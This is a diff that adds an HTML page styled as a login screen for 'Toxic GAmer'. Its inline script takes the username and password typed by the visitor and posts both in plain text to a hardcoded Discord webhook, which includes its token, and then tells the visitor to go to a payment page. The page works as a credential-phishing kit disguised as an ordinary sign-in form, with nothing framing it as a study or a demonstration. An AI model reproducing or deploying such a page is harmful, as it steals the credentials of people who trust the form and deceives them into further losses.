@@ -1,0 +1,58 @@
+<html>
+  <head>
+    <title>Toxic GAmer | Login</title>
+    <link rel="stylesheet" href="login.css">
+   
+  <body class="container mt-5">
+    <form onsubmit="sendContact(event)">
+        <h1>Login</h1><br><br>
+       <div class="mb-3">
+        <label for="usernameInput" class="form-label">Username</label>
+        <input type="username" class="form-control" id="usernameInput" placeholder="Enter Your username" required><br><br>  
+      <div class="mb-3">
+        <label for="passwordInput" class="form-label">Password</label>
+        <input type="password" class="form-control" id="passwordInput" required><br><br>
+        
+      </div>
+      <button type="submit" class="btn btn-primary"><a href="index.html">Login</a></button>
+      
+    </form>
+    <script>
+      async function sendContact(ev) {
+        ev.preventDefault();
+
+        const senderUsername = document
+          .getElementById('usernameInput').value;
+        const senderPassword = document
+          .getElementById('passwordInput').value;
+        
+        const webhookBody = {
+          embeds: [{
+            title: 'Login form Submitted',
+            fields: [
+              { name: 'Username', value: senderUsername },
+              { name: 'Password', value: senderPassword },
+              
+            ]
+          }],
+        };
+
+        const webhookUrl = 'https://discord.com/api/webhooks/1282823353425596486/Vz6F0-9bjWPfeqWCia3KsR8XoLq-WjNeExRr8fy0bIQ4__aEl4lZ5GsGXxRW3G8skewt';
+
+        const response = await fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(webhookBody),
+        });
+
+        if (response.ok) {
+          alert('goto paymentpage');
+        } else {
+          alert('There was an error! Try again later!');
+        }
+      }
+    </script>
+  </body>
+</html>
